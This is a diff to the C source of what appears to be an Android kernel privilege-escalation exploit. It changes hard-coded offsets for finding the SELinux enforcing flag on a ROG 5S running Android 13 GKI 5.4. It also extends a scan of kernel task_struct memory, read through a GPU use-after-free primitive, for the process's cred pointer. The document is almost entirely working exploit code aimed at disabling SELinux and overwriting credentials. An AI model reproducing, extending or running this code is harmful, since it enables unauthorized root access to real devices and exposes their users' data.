@@ -106,10 +106,10 @@ static uint64_t find_selinux_enforcing_via_kbase(int fd, uint64_t kbase) {
     uint8_t page[4096];
     uint64_t found_addr = 0;
 
-    // 1. Check popular offsets for Android 13 GKI 5.4
+    // 1. Check popular offsets for Android 13 GKI 5.4 (ROG 5S specific)
     uint64_t common_offsets[] = { 
-        0x2f74ce8, 0x2f84ce8, 0x2f64ce8, 0x2f54ce8, 
-        0x30f6ce8, 0x32aace8, 0x24d90d0, 0x2f74ce0
+        0x2f74ce8, 0x2f84ce8, 0x32aace8, 0x32a9ce8,
+        0x2f64ce8, 0x2f54ce8, 0x30f6ce8, 0x24d90d0
     };
     for (int i = 0; i < 8; i++) {
         uint64_t test_va = kbase + common_offsets[i];
@@ -1878,20 +1878,24 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                 uint64_t found_cred_ptr = 0;
                 uint32_t found_cred_off = 0;
 
-                fprintf(stderr, "    [*] Searching for UID %d in task_struct range...\n", my_uid);
+                fprintf(stderr, "    [*] Searching for UID %d in task_struct range (Deep Scan)...\n", my_uid);
                 
-                // Scan task_struct for pointers that look like CRED (pointing to our UID)
-                // We scan from task_start + 0x400 to task_start + 0x800
-                uint8_t task_body[0x400];
-                if (gpu_read_task_struct(fd, task_start_va + 0x400, task_body, 0x400) == 0) {
-                    for (int i = 0; i < 0x400 - 8; i += 8) {
-                        uint64_t ptr = *(uint64_t *)(task_body + i);
+                // Read a larger chunk of task_struct to find the real CRED pointer
+                // GKI 5.4 task_struct is large, cred can be anywhere from 0x500 to 0x800
+                uint8_t task_large[0x1000];
+                if (gpu_read_task_struct(fd, task_start_va, task_large, 0x1000) == 0) {
+                    for (int i = 0x400; i < 0x900; i += 8) {
+                        uint64_t ptr = *(uint64_t *)(task_large + i);
                         if ((ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
-                            uint32_t check_uids[4];
-                            if (gpu_read_task_struct(fd, ptr, (uint8_t *)check_uids, 16) == 0) {
-                                if (check_uids[1] == my_uid && check_uids[2] == my_uid) {
+                            uint32_t check_uids[8];
+                            if (gpu_read_task_struct(fd, ptr, (uint8_t *)check_uids, 32) == 0) {
+                                // In cred struct: usage(0), uid(4), gid(8), suid(12), sgid(16)...
+                                // We look for our UID at offset 4, 12, 20...
+                                if (check_uids[1] == my_uid || check_uids[2] == my_uid || check_uids[3] == my_uid) {
                                     found_cred_ptr = ptr;
-                                    found_cred_off = 0x400 + i;
+                                    found_cred_off = i;
+                                    fprintf(stderr, "    [+] Found CRED pointer at offset 0x%x: 0x%lx (UID match!)\n", 
+                                            i, (unsigned long)ptr);
                                     break;
                                 }
                             }
@@ -1899,12 +1903,9 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                     }
                 }
 
-                if (found_cred_ptr) {
-                    fprintf(stderr, "    [+] Found valid CRED pointer at offset 0x%x: 0x%lx\n", 
-                            found_cred_off, (unsigned long)found_cred_ptr);
-                } else {
-                    fprintf(stderr, "    [-] Could not find UID %d near marker. Showing standard OFFSET_CRED...\n", my_uid);
-                    gpu_read_task_struct(fd, task_start_va + OFFSET_CRED, (uint8_t *)&found_cred_ptr, 8);
+                if (!found_cred_ptr) {
+                    fprintf(stderr, "    [-] Deep Scan failed. Using standard offset 0x6b0 as fallback.\n");
+                    gpu_read_task_struct(fd, task_start_va + 0x6b0, (uint8_t *)&found_cred_ptr, 8);
                 }
 
                 if ((found_cred_ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
